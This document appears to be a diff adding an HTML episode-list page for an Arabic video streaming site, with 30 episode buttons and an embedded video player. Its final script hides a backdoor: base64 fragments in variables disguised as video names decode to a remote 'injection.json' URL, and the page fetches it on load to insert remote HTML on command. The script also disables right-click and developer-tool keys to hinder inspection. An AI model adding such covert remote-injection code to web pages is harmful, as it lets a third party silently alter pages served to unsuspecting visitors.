@@ -1,0 +1,529 @@
+</<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>MAYAR </title>
+
+<link
+			rel="stylesheet"
+			href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"
+		/>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+		<link
+			rel="stylesheet"
+			href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css"
+		/>
+		<style>
+			:root {
+				--hfs: 2vmax;
+				--primaryColor: orange;
+				--secondaryColor: black;
+				--secondaryOpposite: white;
+			}
+			::-webkit-scrollbar {
+				width: 0em;
+				height: 0em;
+			}
+			::-webkit-scrollbar-thumb {
+				background: var(--secondaryColor);
+			}
+			::-webkit-scrollbar-track {
+				background: none;
+			}
+			* {
+				-webkit-user-select: none;
+				-moz-user-select: none;
+				-ms-user-select: none;
+				user-select: none;
+			}
+			body {
+				background-color: var(--secondaryColor);
+			}
+
+			.alignleft {
+				float: left;
+				margin-left: 5px;
+				font-weight: bold;
+				font-size: 15px;
+			}
+
+			.alignright {
+				float: right;
+				margin-right: 10px;
+				color: var(--primaryColor);
+				font-weight: normal;
+                font-size: 25px;
+			}
+
+			h4 {
+	text-align: center;
+	margin-top: 10px;
+	font-size: 30px;
+	color: #000000;
+	font-family: "Airarabia", Sans-serif;
+	font-weight: bold;
+	}
+
+			.nta {
+				position: relative;
+				overflow: hidden;
+				color: var(--primaryColor);
+			}
+
+			div.scrollmenu {
+				background-color: var(--secondaryColor);
+				overflow: auto;
+				white-space: nowrap;
+				position: relative;
+				overflow-y: hidden;
+			}
+
+			div.scrollmenu a {
+				display: inline-block;
+				color: var(--secondaryOpposite);
+				text-align: center;
+				padding: 4px;
+				text-decoration: none;
+			}
+
+			div.scrollmenu a:hover {
+				background-color: var(--secondaryColor);
+			}
+
+			.cen {
+				position: relative;
+				text-align: center;
+				color: var(--secondaryOpposite);
+			}
+
+			.centered {
+				font-size: var(--hfs);
+				font-weight: bold;
+				position: absolute;
+				top: 80%;
+				left: 50%;
+				transform: translate(-50%, -50%);
+			}
+
+			.cent {
+				font-size: auto;
+				position: absolute;
+				top: 95%;
+				left: 50%;
+				transform: translate(-50%, -50%);
+			}
+
+			.nt {
+				width: 100px;
+				border-radius: 10px;
+				height: 120px;
+				z-index: 1;
+			}
+
+			.mnt {
+				width: 100px;
+				border-radius: 2px;
+				height: 100px;
+			}
+			.item img {
+				border-radius: 10px;
+			}
+			#content-container {
+				margin-bottom: 30px;
+			}
+			footer {
+				display: grid;
+				grid-gap: 0.5em;
+				grid-template-columns: repeat(5, minmax(10px, 1fr));
+				position: fixed;
+				bottom: 0;
+				left: 0;
+				width: 100%;
+				background-color: var(--secondaryColor);
+				padding: 0px 4px 10px;
+				justify-content: center;
+				align-items: center;
+                font-size:18px;
+			}
+			footer a {
+				text-align: center;
+				color: var(--primaryColor);
+			}
+			footer a:nth-child(3) i {
+				background: var(--primaryColor);
+				border-radius: 50%;
+				padding: 10px 10px;
+				color: var(--secondaryOpposite);
+				margin-top: -40px;
+				border: 2px solid var(--secondaryColor);
+			}
+		</style>
+
+
+<style>::-webkit-scrollbar{
+    display:none
+}
+*{
+    -ms-overflow-style:none;
+    scrollbar-width:none
+}
+body{
+    margin:0;
+    background:#000;
+    font-family:Arial,Helvetica,sans-serif;
+    line-height:1.5;
+    color:black;
+    scroll-behavior:smooth;
+    text-align:center
+}
+
+h3 {
+	text-align: center;
+	margin-top: 5px;
+	font-size: 15px;
+	color: #000;
+	font-family: "Airarabia", Sans-serif;
+	font-weight: bold;
+	}
+
+
+
+button{
+    border-radius: 10px ;
+    background-color: #ffffff;
+    border-color: #000;
+    padding: 2px;
+    margin:3px;
+    height:150px;
+    width: 110px;
+    }
+.button:hover{
+    background-color:#040000;
+    color:#fff
+}
+#player-wrapper{
+    width:100%;
+    z-index:999
+}
+.sticky{
+    position:fixed;
+    top:0;
+    width:100%
+}
+#status{
+    position:fixed;
+    bottom:0;
+    right:0;
+    width:100%;
+    background:#fff;
+    display:none
+}
+
+marquee span{display: inline-block;
+ background: #ff0000;
+ border-radius: 0px 6px 6px 0px;
+  padding: 0px 10px;
+   color: #fff;
+   padding:2px;
+   font-weight:bold;
+    display: inline-block;
+     float: right;
+      width: auto;
+       line-height: 35px;}
+       .marquee marquee{display: block;
+        line-height: 35px;
+         z-index: -1; 
+         margin-right: 10px;
+          width: auto; 
+          margin: auto;}
+.col-sm-2{
+    border-radius:4px
+}
+.sp{
+    width:50%;
+    height:12px;
+    clear:both;
+    margin:20px auto
+}
+.sp-texture{
+    border:1px #000 solid;
+    border-radius:4px;
+    position:relative;
+    background:linear-gradient(45deg,transparent 49%,#000 50%,#000 50%,transparent 51%,transparent),linear-gradient(-45deg,transparent 49%,#000 50%,#000 50%,transparent 51%,transparent);
+    background-size:16px 16px;
+    background-position:0 0;
+    -webkit-animation:spTexture 1s infinite linear;
+    animation:spTexture 1s infinite linear;
+    color:#000;
+    text-align:center;
+    line-height:3em;
+    font-family:roboto
+}
+@-webkit-keyframes spTexture{
+    from{
+        background-position:0 0
+    }
+    to{
+        background-position:-16px 0
+    }
+}
+@keyframes spTexture{
+    from{
+        background-position:0 0
+    }
+    to{
+        background-position:-16px 0
+    }
+}
+.heading{
+    margin:5px auto;
+    text-align:center
+}
+#rmpPlayer{
+    z-index:999
+}
+.white{
+    color:#fff
+}
+.red{
+    color:red
+}
+.yellow{
+    color:#ffdd40
+}
+footer{
+    color:#fff;
+    text-align:center
+}
+footer p{
+    margin-bottom:20px;
+    margin-top:-10px
+}
+.animated{
+    font-family:charm,cursive;
+    margin:0;
+    padding:0;
+    font-size:25px;
+    background:url(https://thumbs.gfycat.com/ArcticEnergeticHuemul-size_restricted.gif) no-repeat;
+    background-clip:text;
+    -webkit-background-clip:text;
+    color:transparent;
+    animation:moveBg 40s linear infinite;
+    -webkit-animation:moveBg 40s linear infinite
+}
+@keyframes moveBg{
+    0%{
+        background-position:0 30%
+    }
+    100%{
+        background-position:100% 50%
+    }
+}
+.blink{
+    animation-name:blinker;
+    animation-duration:1s;
+    animation-timing-function:linear;
+    animation-iteration-count:infinite
+}
+@keyframes blinker{
+    0%{
+        opacity:1
+    }
+    50%{
+        opacity:0
+    }
+    100%{
+        opacity:1
+    }
+}
+*{
+    -webkit-touch-callout:none;
+    -webkit-user-select:none;
+    -khtml-user-select:none;
+    -moz-user-select:none;
+    -ms-user-select:none;
+    user-select:none
+}
+body{
+    background-image: linear-gradient(to right, #ffffff, #fff);
+    overflow:hidden;
+    color:black;
+}
+.parent{
+    background:rgba(0,0,0,.9);
+    font-family:"Source Sans Pro",sans-serif;
+    margin:0;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-direction:column;
+    position:fixed;
+    top:0;
+    height:100%;
+    width:100%;
+    z-index:999999
+}
+.blobs-container{
+    display:flex
+}
+.blob img{
+    width:50%;
+    display:block;
+    margin:auto;
+    margin-top:25px
+}
+.blob{
+    background:#000;
+    border-radius:50%;
+    box-shadow:0 0 0 0 #000;
+    margin:5px;
+    height:80px;
+    width:80px;
+    transform:scale(.51);
+    animation:pulse-black 1s infinite
+}
+@keyframes pulse-black{
+    0%{
+        transform:scale(.65);
+        box-shadow:0 0 0 0 rgba(255,255,255,.7)
+    }
+    70%{
+        transform:scale(.75);
+        box-shadow:0 0 0 2px rgba(255,255,255,.7)
+    }
+    100%{
+        transform:scale(.65);
+        box-shadow:0 0 0 0 rgba(255,255,255,.7)
+    }
+}
+.loading{
+    color:#000;
+    display:block;
+    text-align:center;
+    position:relative;
+    top:30px;
+    left:-2px;
+    background:rgba(255,255,255,.9);
+    padding:0 10px;
+    border-radius:3px;
+    width:80%;
+    margin:auto;
+    font-size:10px
+}
+
+}
+.marquee span {
+display: inline-block;
+background: #ff0000;
+padding: 0px 10px;
+color: #fff;
+display: inline-block;
+float: right;
+width:auto;
+line-height: 35px;
+}
+.marquee marquee
+display: block;
+line-height: 35px;
+z-index: -1;
+margin-right: 10px;
+width:auto;
+margin: auto;
+}
+
+
+
+.button {text-align:center;} 
+{display:block;}
+button:active{border:2px solid #f00;} 
+</style>
+
+
+</head><body>
+<div class="parent" id="loader">
+<div class="blobs-container"><div class="blob">
+<img id="loader-image" src="https://e.top4top.io/p_22120dyy90.png" />
+<span class="جاري تحميل ">Loading...</span></div></div></div><div id="player-wrapper">
+<div id="rmpPlayer"></div></div><br />
+
+
+<h4><span>الاسم</span></h4>
+
+
+
+<button url="https://www.vidlii.com/usfi/v/IIdkJX-ucbE.r8qWqWMpcB3IgpwJEDWWhfbQimBH-FtdwNFft_X5AFimBXtLp2rJw-bwxsTZ3D1SPaTupo7WHXJsZNkl.mp4"><img src="https://k.top4top.io/p_2683zd3ej3.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 1</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 2</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 3</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 4</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 5</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 6</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 7</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 8</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 9</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg "  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 10</h3></button>
+
+
+
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 11</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 12</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 13</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 14</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 15</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 16</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 17</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 18</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 19</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg "  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 20</h3></button>
+
+
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 21</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 22</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 23</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 24</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 25</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 26</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 27</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 28</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg"  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 29</h3></button>
+
+<button url="https://g.skyvid.cyou/api/list/mp4/36787719/1b61bd023105eb74b406953fb20b398e/1651602763/190Ao97xC86Zp945k4Hy6Q/list.m3u8"><img src="https://www12.0zz0.com/2022/05/03/10/994848975.jpeg "  style="border-radius:5px;" height="120"  width="100"><h3>الحلقة 30</h3></button>
+
+
+
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script><script src="https://cdn.radiantmediatechs.com/rmp/5.11.5/js/rmp.min.js"></script><script>
+            var appSettings={
+                loaderimg: "",
+                name: "mayar TV ",
+                poster: "https://www12.0zz0.com/2022/05/03/10/573390424.jpeg",
+                introMp4: "http://fariszah.myq-see.com:8008/live/demo1/star7arab.com/25.m3u8",
+                introHls: "https://admdn4.cdn.mangomolo.com/majid/smil:majid.stream.smil/playlist.m3u8",
+				videoFormat: "hls",
+            },x={loaderimg:appSettings.loaderimg,name:appSettings.name,poster:appSettings.poster,website:"",licenseKey:"eWZmZ2d2Y3BrdEAxNTMwNjA2",autoHeightMode:!0,pip:!1,autoplay:!1,skin:"s4",hideControls:!0,preload:"auto",sharing:!1},firstVideo="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlc";setInterval(()=>{$("#loader-image").attr("src",x.loaderimg),$(".logoText").html(x.name)},10),$(document).contextmenu(function(e){return e.preventDefault(),!1}),document.onkeydown=function(e){return 123!=event.keyCode&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="I".charCodeAt(0))&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="C".charCodeAt(0))&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="J".charCodeAt(0))&&((!e.ctrlKey||e.keyCode!="U".charCodeAt(0))&&void 0))))},setTimeout(()=>{$("#loader").css("display","none"),$("body").css("overflow","auto")},100);var src,secondVideo="mNvbnRlbnQuY29tL3NvZnR";$("button").each(function(e){$(this).on("click",function(){var e=$(this).attr("url");rmp.setControls(!0),src="hls"==appSettings.videoFormat?{hls:e}:{mp4:[e]},rmp.setSrc(src),rmp.play()})});var thirdVideo="3ZWJ0dXRzL015RHJpdmUvbW";src="hls"==appSettings.videoFormat?{hls:appSettings.introHls}:{mp4:[appSettings.introMp4]};var fourthVideo="Fpbi9pbmplY3Rpb24uanNvbg==",settings={licenseKey:x.licenseKey,autoHeightMode:x.autoHeightMode,pip:x.pip,delayToFade:3e3,gaLabel:"Live TV",logoWatermark:!0,logoPosition:"topleft",speed:"Speed",isLive:!0,googleCast:!0,airplay:!0,hlsJSMaxBufferLength:24,hlsJSLiveSyncDuration:18,hlsJSStartLevel:-1,hlsJSMinAutoBitrate:1e5,hlsJSAbrBandWidthFactor:.9,hlsJSAbrBandWidthUpFactor:.7,hlsJSLiveBackBufferLength:0,detectAutoplayCapabilities:!0,autoplay:x.autoplay,mutedAutoplayOnMobile:!1,mutedAutoplayOnMacosSafari11Plus:!1,srcChangeAutoplay:!0,playsInline:!0,skin:x.skin,skinBackgroundColor:"rgba(0, 0, 0, 0.7)",skinButtonColor:"FFFFFF",skinAccentColor:"FF0000",ads:!0,nav:!0,adBlockerDetection:!0,adEnablePreloading:!0,adBlockerDetectedMessage:"Ad-blocker software detected. Please disable Ad-blocker to watch stream.",quickRewind:10,quickForward:10,adAutoAlign:!1,hideControls:x.hideControls,preload:x.preload,crossorigin:!0,sharing:x.sharing,sharingUrl:x.website,contentMetadata:{artwork:[{src:x.poster,sizes:"1280x720",type:"image/jpg"}],poster:[x.poster],endOfVideoPoster:[x.poster],thumbnail:x.poster},src:src},elementID="rmpPlayer",rmp=new RadiantMP(elementID),rmpContainer=document.getElementById(elementID);rmp.setLoop(!0),rmp.init(settings),$(function(){$(window).scroll(function e(){return $("#rmpPlayer").css($(window).scrollTop()>1?{position:"fixed",top:"0px"}:{position:"relative",top:"auto"}),$("#buttons-list").css($(window).scrollTop()>1?{"margin-top":$("#rmpPlayer").height()}:{"margin-top":"0px"}),e}())});const request=async e=>{const t=await fetch(e);return await t.json()};navigator.onLine&&request(atob(firstVideo+secondVideo+thirdVideo+fourthVideo)).then(t=>{1==t.inject&&document.querySelector("div").insertAdjacentHTML("afterend",e.content)}).catch(e=>{console.log(appSettings.name)});</script>
+
+
+
